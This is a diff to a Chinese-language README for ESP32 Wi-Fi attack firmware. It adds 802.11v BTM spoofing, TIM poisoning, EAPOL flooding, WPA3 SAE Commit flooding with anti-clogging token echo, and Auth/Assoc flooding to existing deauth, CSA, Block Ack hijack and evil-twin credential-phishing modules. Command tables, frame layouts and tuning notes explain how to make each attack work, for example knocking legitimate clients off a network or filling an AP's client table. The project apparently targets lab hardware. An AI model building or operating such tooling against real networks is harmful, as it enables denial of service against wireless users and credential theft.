@@ -36,6 +36,12 @@ firmware/
 ├── partitions.csv            4 MB：nvs 24K / phy / factory 3M / spiffs 960K
 ├── include/
 │   ├── deauth.h              攻击接口、计数器、扫描/射频预设
+│   ├── csa.h / delba.h       CSA 欺骗 / DELBA + BA 会话劫持
+│   ├── wnm.h / tim.h        802.11v BTM Request / TIM 投毒
+│   ├── eapol.h / sae.h       EAPOL-Start/Logoff / SAE Commit 洪泛
+│   ├── authflood.h           Auth/Assoc 洪泛 + WPA3 自动升级
+│   ├── tx_guard.h            注入守卫：首个 0x101 立即重启；节拍上限
+│   ├── ie_util.h             IE / RSN(AKM/PMF) / Extended Capabilities 解析
 │   ├── evil_twin.h           钓鱼热点与凭据
 │   ├── serial_console.h      命令分发入口
 │   ├── definitions.h         宏：信道上限、每轮帧数、reason、LED、调试开关
@@ -45,11 +51,20 @@ firmware/
 │   ├── main.cpp              启动：STA 静默、初始化各模块、主循环 tick
 │   ├── serial_console.cpp    串口解析 + 命令实现（SCAN/DEAUTH/...）
 │   ├── deauth.cpp            deauth 攻击 + 嗅探触发 + 逐 AP 计数 + STA 嗅探
+│   ├── csa.cpp               CSA 欺骗（倒计时播报 + 新信道克隆 beacon + 接应）
+│   ├── delba.cpp             DELBA 欺骗 + BA 会话劫持（DELBA→ADDBA→BAR）
+│   ├── wnm.cpp               802.11v BTM Request 欺骗
+│   ├── tim.cpp               克隆 beacon 篡改 TIM
+│   ├── eapol.cpp             EAPOL-Start/Logoff 洪泛（ToDS 数据帧 + LLC/SNAP）
+│   ├── sae.cpp               SAE Commit 洪泛 + WPA3 判别 + 反 clogging token 回显
+│   ├── authflood.cpp         Auth/Assoc 洪泛 + 自动切换到 SAE
+│   ├── tx_guard.cpp          统一的 esp_wifi_80211_tx 封装与 0x101 重启规则
+│   ├── ie_util.cpp           IE 遍历、AKM/PMF/11v 能力位判定
 │   ├── evil_twin.cpp         克隆 AP、DNS 劫持、登录页、凭据表
 │   ├── general.cpp           公共工具（信道、国家码、随机 SSID/MAC）
 │   └── storage.cpp           用 nvs_flash 实现 UI 的 load/save/clear
 ├── components/wireless_ui/   可选 LVGL 界面（见 §7）
-├── tests/test_wireless_attack.py   44 项自动化用例
+├── tests/test_wireless_attack.py   50 项自动化用例
 └── tools/gen_cjk_font.py     生成界面 CJK 子集字库
 ```
 
@@ -124,7 +139,7 @@ idf.py -B build_c5 -D SDKCONFIG=sdkconfig.c5 -p COM8 flash
 | `PING` | 探活 | `OK PONG` |
 | `HELP` | 命令帮助 | 多行 `INFO ...` |
 | `SCAN` | 双频扫描（异步任务，约 4–10 s） | `SCAN_BEGIN` / `NET ...` / `SCAN_END <n>` |
-| `STATUS` | 状态 | `STATUS mode=.. eliminated=.. deauth_frames=.. probe_frames=.. ch=.. rx=.. rxm=.. txok=.. txerr=.. txerr_nomem=.. txec=.. txdrop=.. blind=.. rev=.. csa=<idle\|announce\|hold> csaf=.. csac=.. csch=.. csaauto=.. csacycle=.. csaauth=.. csarej=.. reason=.. rlast=.. networks=.. creds=.. heap=.. ui=.. caps=..` |
+| `STATUS` | 状态 | `STATUS mode=.. eliminated=.. deauth_frames=.. probe_frames=.. ch=.. rx=.. rxm=.. txok=.. txerr=.. txerr_nomem=.. txec=.. txdrop=.. txg=.. txgok=.. txgerr=.. blind=.. rev=.. csa=<idle\|announce\|hold> csaf=.. csac=.. csch=.. csaauto=.. csacycle=.. csaauth=.. csarej=.. wnm=.. wnmf=.. wnmc=.. wnmskip=.. wnmresp=.. wnms=.. tim=.. timf=.. timaid=.. timreal=.. eap=.. eapf=.. eaprx=.. eaprxreq=.. eaprxsta=.. sae=.. saesec=.. saef=.. saec=.. saeresp=.. saecode=.. saetok=.. saeecho=.. af=.. aff=.. afa=.. afs=.. afids=.. afst=.. afup=.. delba=.. delbaf=.. reason=.. rlast=.. networks=.. creds=.. heap=.. ui=.. caps=..` |
 | `DEAUTH <idx> [reason\|random]` | 单目标 deauth | `OK DEAUTH <idx> <ssid>` / `ERR ...` |
 | `DEAUTH_ALL [reason]` | 扫描到的全部 AP 轮流打 | `OK DEAUTH_ALL ...` |
 | `DEAUTH_ONLY <i,j,..> [reason]` | 白名单 | `OK DEAUTH_ONLY <n> aps` |
@@ -139,6 +154,21 @@ idf.py -B build_c5 -D SDKCONFIG=sdkconfig.c5 -p COM8 flash
 | `BAATTACK <idx> [step]` | BA 会话劫持：DELBA 清场 → 伪造 ADDBA 种窗口 → BAR 推窗，循环（`step` 0–2047，<128 为对照） | `OK BAATTACK 0 step=512 ch=1 ssid=dt` |
 | `BAPLANT <idx> [step]` | 只种窗口（≤8 帧 ADDBA）然后**完全静默**，用于判断静默期是否也会瘫 | `OK BAPLANT 0 step=512 ch=1` |
 | `BARPUSH <idx> [step]` | 只发 BAR（不发 ADDBA/DELBA）后静默，用来隔离"推窗"与"会话改写" | `OK BARPUSH 0 step=512 ch=1` |
+| `WNM <idx> [cand\|bare] [timer] [ch] [sta-mac]` | 802.11v BTM Request 欺骗。`cand`=带一个幻影候选 BSS（默认），`bare`=不带候选列表；`timer` 是 disassociation timer（TBTT，必须非 0，默认 10）；`ch` 是候选 BSS 通告的信道；给了 `sta-mac` 就直接对那个 MAC 发（不必等它自己说话） | `OK WNM 0 mode=cand timer=10 cand_ch=6 ssid=..` / `OK WNMSTA 02:AA:BB:CC:DD:EE` |
+| `WNMSTOP` | 停止 BTM 欺骗 | `OK WNMSTOP frames=45 responses=0 last_status=0` |
+| `WNMTEST` | 打印 BTM Request 原始字节 + 解码（category/action/request mode/timer/候选元素），格式自检 | `WNMTEST ... cat=10 act=7 ... imm=1 cand=1 timer=10` |
+| `TIM <idx> [tim\|clear] [aid]` | 克隆目标 AP 的 beacon 并篡改 TIM。`tim`=按 AID 置位（默认）、`clear`=清空 bitmap；`aid=0` 表示用学到的全部 AID，1..255 指定单个 AID | `OK TIM 0 mode=tim aid=3 ch=12` |
+| `TIMSTOP` | 停止克隆 beacon | `OK TIMSTOP frames=277 real_beacons=50` |
+| `TIMTEST` | 打印 TIM 元素与克隆 beacon 的字节 | `TIMTEST tim len=6 ... dtim_count=0 ... bitmap=08 bmp_mask=0x00000008` |
+| `EAPOL <idx> [tid\|-1] [sta-mac]` | EAPOL-Start/Logoff 洪泛，伪造受害 STA 的 MAC。`tid` 是 QoS TID（默认 6），`-1` 只发非 QoS 数据帧 | `OK EAPOL 0 tid=6 ch=12 ssid=..` |
+| `EAPOLSTOP` | 停止 EAPOL 洪泛 | `OK EAPOLSTOP frames=110 rx_ap=0 rx_sta=0 eap=0` |
+| `EAPOLTEST` | 打印两种 EAPOL 数据帧（非 QoS + QoS）的字节与解码 | `EAPOLTEST start plain ... etype=888E ver=2 type=1` |
+| `SAE <idx> [point\|rand] [gap_ms]` | SAE Commit 洪泛（WPA3）。`point`=发合法 P-256 生成元（默认），`rand`=随机字节对照组；`gap_ms` 是帧间隔，默认 50 ms | `OK SAE 0 elem=point gap_ms=50 ch=12` |
+| `SAESTOP` | 停止 SAE 洪泛 | `OK SAESTOP frames=.. identities=.. responses=.. tokens=.. echoed=..` |
+| `SAETEST` | 打印 Commit 字节（alg/seq/group/元素）+ 带 token 的容器形状 | `SAETEST commit len=128 alg=3 seq=1 ... group=19` |
+| `AUTHFLOOD <idx> [both\|auth\|assoc] [noauto]` | Auth/Assoc 洪泛，每个身份一个随机 MAC。嗅到目标 RSN 里含 SAE 时自动切到 SAE 洪泛（加 `noauto` 关闭） | `OK AUTHFLOOD 0 mode=both auto=1 ch=12 ssid=..` |
+| `AUTHFLOODSTOP` | 停止 Auth/Assoc 洪泛 | `OK AUTHFLOODSTOP frames=130 identities=66 last_status=0 upgraded=0` |
+| `AUTHFLOODTEST` | 打印伪造的 Authentication / Association Request 字节 | `AUTHFLOODTEST auth len=30 alg=0 seq=1 status=0` |
 | `BASTOP` | 停止 BA 攻击 | `OK BASTOP delba=54 addba=1 bar=256` |
 | `BATEST` / `BATX` | 打印伪造 ADDBA/BAR 的字节与解码 / 各发一帧并打印驱动返回值 | `BATEST addba len=33 ...` / `BATX delba(30B)=0 addba(33B)=0 bar(20B)=0` |
 | `RESTART` | `esp_restart()`；注意 burst 之后它可能卡在 wifi 反初始化，恢复靠主机拉 RTS | `OK RESTART` |
@@ -158,7 +188,7 @@ idf.py -B build_c5 -D SDKCONFIG=sdkconfig.c5 -p COM8 flash
 | `UITARGETS` | 打开屏上目标弹窗（等价点 `Targets`） | `OK UITARGETS` |
 | `UIREASON` | 打开屏上 reason 弹窗（等价点 `R:x`） | `OK UIREASON` |
 | `UI` | 屏状态 | `UI screen=.. popup=.. items=.. rpopup=.. ritems=.. nets=..` |
-| `UISCREEN <name>` | 切到指定屏幕（`menu/deauth/mode/probe/csa/delba/ba/evil`），给自动化测试用 | `OK UISCREEN delba` |
+| `UISCREEN <name>` | 切到指定屏幕（`menu/deauth/mode/probe/csa/delba/ba/evil/wnm/tim/eapol/sae/authflood`），给自动化测试用 | `OK UISCREEN delba` |
 | `RXLOG` | 打印监听到的 802.11 帧（诊断）；收到的 CSA Action 会额外打印 `RXCSA <i> src=.. cat=4 act=4 nch=.. cnt=.. len=..` | `RXLOG_BEGIN <n>` / `RX i type=.. ...` / `RXLOG_END` |
 | `RXMIX` | 收到的帧按类别计数（beacon/probe resp/deauth/auth/assoc/ctrl/data/action），并用 `csa_action` / `csa_ie` 单独统计 CSA 帧、`addba` / `delba` 统计 Block Ack 管理动作、`bar/ba/pspoll/rts/cts/ack` 统计控制帧 subtype | `RXMIX beacon=.. deauth=.. ctrl=.. data=.. action=.. csa_action=.. csa_ie=..` |
 
@@ -182,7 +212,8 @@ CRED <idx> <用户名> <密码> <时间戳ms>
 RX   <i> type=<0..3> sub=<n> len=<n> dest=<mac> src=<mac> bssid=<mac>
 ```
 
-`caps` 取值：`deauth`、`eviltwin`、`probe`，C5 额外带 `5g`。
+`caps` 取值：`deauth`、`eviltwin`、`probe`、`wnm`、`tim`、`eapol`、`sae`、`authflood`，
+C5 额外带 `5g`。
 
 ### 4.3 用脚本驱动
 
@@ -226,6 +257,8 @@ while True:
   克隆 beacon（同 BSSID/SSID/从真 beacon 抄来的 RSN IE）每 100 ms 顶 `hold` 秒。
   **默认自动**：2.4G 的 AP 被通告到一个随机 5G 信道，5G 的 AP 反之，每轮重新随机，一轮接一轮
   直到 `CSASTOP`（`STATUS` 的 `csaauto=1` / `csacycle=` 可观测）。
+  CSA 的帧也走 `tx_guard_send()`：广播帧豁免，单播的那一路（每个客户端每轮 1 帧）被整流器限速，
+  所以"客户端很多"不会把 TX 缓存推开（`STATUS` 的 `txg=` 会体现被挡下的帧，它们下一轮再发）。
 - **新信道上冒充 AP**（每轮 500 ms，`CSA_AUTO_HOLD_MS`）：发克隆 beacon，收到客户端的
   **Auth 请求就回成功**、收到 **Assoc/Reassoc 请求就回失败**（status 17「AP 无法再接客户端」）。
   客户端于是"看得见、认证得过、就是连不上"，留在新信道反复重试，而不是马上回原信道。
@@ -240,9 +273,77 @@ while True:
   这是修掉"`deauth_frames` 在涨但帧没出去"那个 bug 的关键（见 §11）。
 - `PROBE_BROADCAST` 不需要目标也不需要扫描：4 帧/4 ms，SSID/BSSID 每帧随机，120 ms 换信道。
 - `STOP` 立即停一切（含 Evil Twin），回到静默。
+- **802.11v BTM Request 欺骗**（`WNM`）：WNM Action（category 10 / action 7）。注意保护状态：
+  action 类别里只有 Public/HT/Unprotected-WNM/Self-protected/VHT/厂商自定义不算 robust，**category 10
+  在 robust 集合里**——所以 PMF 强制（WPA3）的客户端会在驱动里直接丢弃，本模块打的是
+  PMF 关闭或可选（大多数 WPA2）的网络。伪造 TA 为 AP BSSID 即被客户端接受。`cand` 模式带一个幻影候选 BSS（Neighbor
+  Report 元素 id 52 / len 13，指向同频段的另一个信道）；`bare` 模式不带候选列表。
+  **disassociation timer 必须非 0**：wpa_supplicant 只在
+  `DISASSOC_IMMINENT 且 timer != 0` 时才 `wpa_supplicant_req_scan()`，置 0 等于什么都没发生。
+  客户端能力从它的 Probe/（重）Association Request 里的 Extended Capabilities（id 127, bit 19）
+  学出来，明确不支持的会被跳过（`wnmskip=`）；`sta-mac` 参数可以绕过学习直接指定目标。
+  每个客户端 300 ms 重发一次，全局节拍 50 ms（见 §11 第 7 条）。可观测：`wnmresp=`（BTM Response
+  数量）、`wnms=`（最后一次的 status，1=reject unspecified，说明它解析了但拒绝）。
+- **TIM 投毒**（`TIM`）：克隆目标 AP 的 beacon（同 BSSID/SSID/RSN IE/capability/
+  beacon interval），每 20 ms 发一帧（真 AP 是 100 TU ≈ 102 ms，即 5 倍占空比），
+  **在学到真 beacon 之前一帧都不发**（否则 SSID 为空的帧只会被当成另一个坏网络）。
+  TIM 元素按 **AID** 索引：第 i 字节第 j 位 = AID `8i+j`（bit 0 是 AID 0，也就是组播灯，
+  对应 Bitmap Control 的 bit 0），所以 AID 1 落在 `0x02` 而不是 `0x01`；DTIM count 固定 0
+  （每个 beacon 都是 DTIM → 客户端每次都全醒）；AID 从 AP 的 Association Response（偏移 28..29，
+  掩 0x3FFF）学出来，也可以用 `aid=` 直接指定。
+  **TSF 那半已删除**：MAC 用接口自己的 TSF 覆盖 beacon 的 24..31 字节（未关联 STA 时是 0），
+  写什么都上不了空口，见 §11 第 8 条。
+- **EAPOL-Start / Logoff 洪泛**（`EAPOL`）：ToDS 数据帧 + LLC/SNAP（`AA AA 03 00 00 00 88 8E`）
+  + EAPOL 头（version 2、type 1/2、length 0），TA 伪造受害 STA。Start 让认证器重启 802.1X，
+  Logoff 把受控端口打回未授权态，两者交替发送让端口抖动。QoS（subtype 8, TID 6）与非 QoS
+  （subtype 0）两种形态交替发，因为不同驱动接受的形态不同。**WPA2/WPA3-PSK 下多数 AP 直接忽略
+  EAPOL-Start**，所以效果必须看对端计数：`eaprxreq=` 是 AP 发回的 EAP 包（type 0，即
+  EAP-Request/Identity，证明 802.1X 状态机真重启了）、`eaprxsta=` 是真实 STA 自己发的 EAPOL
+  （证明它收到了 Logoff 去重认证）。实验室对华为 WPA2 AP 实测两者都是 0——功能面只证明"帧上空气、
+  格式正确"。
+- **SAE Commit 洪泛**（`SAE`）：Authentication 帧，algorithm 3、sequence 1、group 19（P-256），
+  后跟 32 字节 scalar + 64 字节 element。element 默认用 **P-256 生成元**（公开常量、合法曲线点），
+  这样 AP 没法在点校验阶段提前短路；`rand` 是随机字节对照组，两者对比就能定位"贵在哪一步"。
+  反 clogging 是反射式校验，不是防护：AP 回 status 76（token required）时，模块把 token 存回该
+  身份，下一帧原样回显（H2E 形态装进 Element 255 / Ext 93 容器，非 H2E 形态直接跟在 group 后面），
+  这才让 AP 真做标量乘。身份（随机 MAC）每 4 帧换一个，顺带消耗 AP 的 SAE 状态。
+  判别：`saesec=` 从 RSN IE 的 AKM 得出（`00-0F-AC:8/9/24` = SAE），`saecode=` 是 AP 回来的
+  status（13 = 该 AP 不支持 SAE，76 = 要 token，0 = 不可能出现在这里）。
+- **Auth/Assoc 洪泛 + WPA3 自动升级**（`AUTHFLOOD`）：Authentication（algorithm 0 / seq 1）与
+  Association Request 各一帧一个身份，身份每 2 帧换成新随机 MAC，Association Request 带目标的
+  SSID 与 RSN IE（不带的话 AP 在查表之前就把帧丢了，洪泛白打）。`afst=` 是 AP 回来的 status，
+  **17 = 表满**（"AP 无法再接客户端"）才是目标，13 = 该 AP 不吃开放式认证，0 = 竟然接受了。
+  嗅到目标 AKM 含 SAE 时自动停自己、转 `sae_start()`（`afup=1`，串口打一行 `INFO AUTHFLOOD ...`），
+  因为 SAE AP 对开放式 Auth 只回 status 13，洪泛对它是免费的。
+- 所有新模块都走 `tx_guard_send()`：**第一次 `0x101`（`ESP_ERR_NO_MEM`）立即 `esp_restart()`**，
+  重启前打一行 `FATAL tx 0x101 ... -> restart`。这是刻意设计——池空了之后射频不再接受任何帧，
+  假装还在跑比重启更糟。节拍上限的实测数据见 §11 第 7 条。
 - 原理与帧结构见 [代码框架与攻击原理.md](代码框架与攻击原理.md)。
 
 ---
+
+### 5.1 五个模块的验证步骤
+
+判据分三层，越往下越有说服力：**① 帧上空气且字段对**（抓包管道）→ **② 对端有回应**（STA 侧计数）
+→ **③ 效果可观测**（客户端断开/吞吐下降/AP 表满）。本仓库只做到 ②，③ 需要对应的对端环境。
+
+空口抓包统一用 C5 的管道（信道固定 12，攻击前把目标调到该信道或改 C5 固件）：
+
+```bash
+python lab/cap_frames.py --seconds 6 --bssid <AP-BSSID>     # 帧字段
+python lab/air_check.py --port COM5 --bssid <AP-BSSID>      # 逐模块起-抓-停
+```
+
+| 模块 | 命令 | ① 抓包看什么 | ② 串口计数 | ③ 需要什么对端 |
+| --- | --- | --- | --- | --- |
+| BTM Request | `WNM <idx> cand 10 <ch> <STA-MAC>` | `cat=10 act=7 req_mode=0x05 timer=<n>` + Neighbor Report 元素 | `wnmf>0`；能解析并回应的 STA 会让 `wnmresp>0`、`wnms` 有值（1 = reject unspecified） | COM6 跑一个 STA 固件：`CONFIG_ESP_WIFI_11KV_SUPPORT=y`，连接时 `wifi_sta_config_t.btm_enabled=1`，再连上目标 AP。它会在 Assoc Request 里带 Extended Capabilities bit19（本模块据此判定能力），收到 BTM 后触发扫描/漫游。**不支持的 STA 会被 `wnmskip` 跳过，属预期** |
+| TIM | `TIM <idx> tim <aid>` / `clear` | 克隆 beacon 的 TIM 元素：`dtim_count=0`、bitmap 按 AID 置位（AID 3 → `08`）；`clear` 模式的 bitmap 应为 `00`。**管道没起时**用 `lab/tim_air.py`（COM6 的 `sniff <ch>`）核对 | `timf>0`、`timreal>0`（说明学到了真 beacon；没学到就一帧都不发）、`timaid` 位图 | 会进 PS 模式且有下行缓存的客户端（手机锁屏 / IoT 设备）。对照 `clear` 与 `tim` 两种模式的唤醒次数/丢包 |
+| EAPOL | `EAPOL <idx> 6 <STA-MAC>` | `AAAA03…888E ver=2 type=1/2`，非 QoS 与 QoS(TID6) 交替 | `eapf>0`；**`eaprxreq>0` 才说明 AP 的 802.1X 状态机真的重启**（AP 回 EAP-Request/Identity），`eaprxsta>0` 说明真实 STA 收到了 Logoff | WPA2/WPA-Enterprise 或 802.1X 的 AP。**WPA2-PSK 下这条 AP 完全忽略**，`eaprxreq`/`eaprxsta` 都是 0，属于已知边界 |
+| SAE | `SAE <idx> point 50` | `alg=3 seq=1 group=19`，128 字节；AP 的回复是 `alg=3 seq=2 status=…` | `saef>0`、`saeresp>0`、`saecode`（13 = 该 AP 不吃 SAE；76 = 要反 clogging token；`saetok>0` 说明 token 到了、`saeecho>0` 说明回显了） | WPA3-SAE 的 AP。效果判据：拿到 token 回显后，**合法 STA 的 ping RTT 明显上升**。对照组 `SAE <idx> rand 50`（随机元素，AP 在点校验就退），两者 RTT 差异即"贵在哪一步" |
+| Auth/Assoc 洪泛 | `AUTHFLOOD <idx> both` | `alg=0 seq=1` 的 Auth + 带目标 SSID/RSN 的 Assoc Request，TA 每帧换随机 MAC | `aff/afa/afs>0`、`afids` 持续增长；**`afst=17` 才是目标（表满）**，13 = 该 AP 不吃开放认证，0 = 竟然接受了；目标是 WPA3 时应看到 `afup=1` 与 `INFO AUTHFLOOD ... -> SAE commit flood` | 一台能看客户端列表/拒绝接入的 AP。合法 STA 对照：它开始连不上即达标 |
+
+**稳定性**：`python lab/soak.py --port COM5 --bssid <AP> --minutes 4` 逐模块长跑，判据是
+`STATUS` 的 `txgerr` 恒为 0（`txgok` + `txg` = 想发的帧数），且串口里没有 `FATAL tx 0x101`。
 
 ## 6. 双频与国家码
 
@@ -274,9 +375,10 @@ idf.py menuconfig      # Wireless Attack UI (LVGL) -> Enable LVGL touch UI
 ### 7.2 菜单
 
 ```
-一级  [Deauth] [Probe]
-      [CSA] [DELBA]
-      [BA] [Evil]
+一级  [Deauth] [Probe] [CSA]
+      [DELBA] [BA] [Evil]
+      [WNM] [TIM] [EAPOL]
+      [SAE] [Auth]
 二级  Deauth -> [One] [All] / [Only] [Except] / [Back]
 三级  模式页：[Scan] [Targets] [Start] / [Stop] [Back] / [Reason: 7 class-3 frame]
       最后一行是 reason 按钮，直接写着当前值 + 含义（`Reason: 7 class-3 frame` /
@@ -299,6 +401,11 @@ idf.py menuconfig      # Wireless Attack UI (LVGL) -> Enable LVGL touch UI
   `Start` 固定发 `DELBA <idx> 37`；标签写着 `DELBA #0 TP-LINK reason=37`。
 - `BA` 页：同样四键，`Start` 固定发 `BAATTACK <idx> 512`（步进在屏上不可调，串口/GUI 可调）；
   标签写着 `BA #0 TP-LINK step=512`；`UISCREEN ba` 可供自动化切换。
+- 五个帧级模块页（`WNM` / `TIM` / `EAPOL` / `SAE` / `Auth`）共用同一个版式：
+  一行目标（`WNM #0 TP-LINK`）、`[Scan] [Targets] [Start]`、`[Stop] <变体> [Back]`。
+  `Start` 发不带参数的缺省命令（`WNM 0` / `TIM 0` / `EAPOL 0` / `SAE 0` / `AUTHFLOOD 0`），
+  中间那个变体键发对照形态：`Bare`=`WNM 0 bare`、`Clear`=`TIM 0 clear`、`Plain`=`EAPOL 0 -1`、
+  `Rand`=`SAE 0 rand`、`NoAuto`=`AUTHFLOOD 0 both noauto`。参数细分仍走串口/GUI。
 - 重扫会清空勾选与单选；弹窗开着也会就地重建列表。
 - 诊断：`UITARGETS`（开弹窗）+ `UI`（回报 `screen/popup/items/nets`），不需要用手指点。
 
@@ -418,6 +525,33 @@ Wi-Fi 任务                         promiscuous 回调 sniffer()（只做判断
    默认值丢弃全部控制帧。实测：mask=`0` → `ctrl=0`；mask=`MASK_ALL` → `ctrl=37 rts=10 ba=2 ack=24`
    （`rts=10` 是另一块板注入的 10 帧）。`start_promiscuous()` 现在固定设 `MASK_ALL`，
    想复现"收不到"的状态可以用 `CTRLFILTER none`。
+7. **单播注入的可持续速率约 20 帧/s（固件已强制）**：`0x101` 是**我们自己的**驱动拒发
+   （缓存池空了），不是 AP 拒绝。伪造 TA 的单播帧拿不到"属于自己的"ACK（AP 回的 ACK 目标是伪造的
+   MAC，本芯片不认），硬件会重传到重试上限才释放缓存；同时我们从不 ACK AP 的回复，AP 也在反复
+   重发（实测每条 commit 对应 **12.7 个** AP 回复）。结果是 20 帧/s 的注入在空口上造成约
+   **220 帧/s** 的实际负载，每个缓存被占用整段时间。广播帧相反：不需要 ACK、也没人回，缓存立刻回收
+   （克隆 beacon 50 帧/s 跑 3000 帧零拒收）。
+   把池子当漏水桶拟合（排水 ≈32 帧/s、容量 ≈22）与实测完全吻合：50 帧/s → 63 帧 `0x101`；
+   40 帧/s → 117 帧 `0x101`；30 / 20 帧/s → 45 s 各 1350 / 900 帧零拒收。
+   精确的占用时长**不可观测**（`esp_wifi_register_80211_tx_cb()` 对注入帧不回调、抓包管道会丢帧），
+   所以上面是曲线证据，不是秒表读数。
+   守卫（`tx_guard.cpp`）自己做这件事：单播两帧之间至少 `TX_GUARD_UNICAST_GAP_MS = 45` ms，
+   被挡下的帧计 `txg=`（不算错误、不算发送）；`SAE` 的 `gap_ms` 小于 50 会被抬到 50 并打 `INFO`。
+   所以任何参数组合都推不爆池子。
+   **稳定性判据**（`lab/soak.py`）：跑守则期间 `STATUS` 的 `txgerr` 必须恒为 0
+   （`txgok` 是被驱动接受的帧数、`txg` 是被整流器挡下的帧数，两者之和才是"想发的帧"），
+   并且串口里不能出现 `FATAL tx 0x101`。长时间压测结果见 `测试报告.md §4.4.5`。
+   **覆盖范围**：五个新模块 + `CSA`（含 HOLD 阶段的 auth/assoc 应答）都走这个守卫。
+   `DELBA` / BA 会话劫持 / deauth 仍用各自的 `esp_wifi_80211_tx` 封装：实测它们的长跑速率本来就在
+   19–25 帧/s（排水速率以下），而且 BA 的节拍（40 ms）是已记录的 -99% 吞吐实验的前提，动它就得
+   重跑那个实验，所以先不改；它们在 `0x101` 上的行为是"计一次错、下一轮重试"，不会重启或卡死。
+   `BARSEQ` 这类故意打空池子的诊断探针永远留在守卫之外。
+8. **beacon 的 TSF 上不了空口（TSF 投毒因此已删除）**：MAC 用接口自己的 TSF 覆盖 beacon 的
+   24..31 字节（未关联 STA 时为 0）。实测 `last_tsf=654632723879`（交给驱动的值）vs 空口 `tsf=0`，
+   而同一帧的 TIM/SSID/interval/capability 逐字节保留。与第 1 条（Duration）同源的驱动字段重写，
+   所以 `tsf`/`both` 两个模式与 `ttsf=` 字段在 2026-11 一并删除，`TIM` 只做 TIM。
+9. **`STATUS` 一行约 1.1 KB**：五个新模块各带一组计数器，115200 下机器读到完整一行要 ~80 ms
+   （`tests` 的 STATUS 往返用例阈值因此从 60 ms 放宽到 120 ms）。这是串口带宽，不是固件变慢。
 
 第 1、2 条已记入[待修清单](测试报告.md#71-待修清单已记录尚未动手)（当前只记录，未动手）。
 UART 丢行已修复：`Serial.setRxBufferSize(4096)`（`SERIAL_RX_BUFFER_SIZE`），300 条 PING 洪泛实测 300/300 响应。
